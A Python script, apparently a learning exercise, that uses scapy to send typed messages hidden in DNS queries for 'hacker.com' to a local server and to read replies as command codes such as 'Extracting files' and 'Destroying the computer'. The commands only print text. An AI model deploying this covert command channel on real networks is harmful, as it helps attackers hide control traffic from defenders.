from scapy.all import *
import struct

# Destination info
target_ip = "192.168.1.114" # or the server's IP
target_port = 9999 # same as SERVER_PORT
client_port = 12345  # any free source port
DOMAIN_NAME = "hacker.com"

COMMAND_DICT = {"0.0.0.1": "Extracting files...",
                "0.0.0.2": "Destroying the computer...",
                "0.0.0.3": "Self Destructing...",
                "0.0.0.4": "Doing Nothing"}

def send_packet():
    message = input("enter message:\n>>")
    dns_query = build_dns_query(f"{message}.{DOMAIN_NAME}")
    udp_header = create_udp_header(client_port, target_port, len(dns_query))
    payload = udp_header + dns_query

    packet = IP(dst=target_ip, proto=17) / Raw(load=payload)
    send(packet, verbose=0)

    print("Packet sent")


def create_udp_header(src_port, dest_port, data_length):
    length = 8 + data_length
    checksum = 0
    return struct.pack('!HHHH', src_port, dest_port, length, checksum)

def build_dns_query(domain):
    # DNS Header
    transaction_id = 12345  # A random transaction ID
    flags = 0x0100  # Standard query (Recursion Desired)
    questions = 1
    answer_rrs = 0
    authority_rrs = 0
    additional_rrs = 0

    # Query Section for "A" record
    qname = encode_domain_name(domain)
    qtype = 1  # Type A (IPv4 address)
    qclass = 1  # Class IN (Internet)

    # Packing the DNS query
    query = struct.pack("!HHHHHH", transaction_id, flags, questions, answer_rrs, authority_rrs, additional_rrs)
    query += qname
    query += struct.pack("!HH", qtype, qclass)

    return query

def encode_domain_name(domain):
    labels = domain.split('.')
    encoded_name = b""
    for label in labels:
        encoded_name += struct.pack("B", len(label)) + label.encode()
    encoded_name += b"\x00"  # Null byte to end the domain name
    return encoded_name

def parse_dns_response(response):
    # Extract the IP address from the answer section (last 4 bytes)
    ip_address = socket.inet_ntoa(response[-4:])
    return ip_address

def main():

    send_packet()
    
    response = sniff(filter=f"udp and dst port {client_port}", timeout=15, count=1)

    if response:
        print("Received response...")
        ip = parse_dns_response(bytes(response[0]))
        print(COMMAND_DICT.get(ip, f"unrecognized command: {ip}"))

    else:
        print("No response received.")


if __name__ == "__main__":
    main()
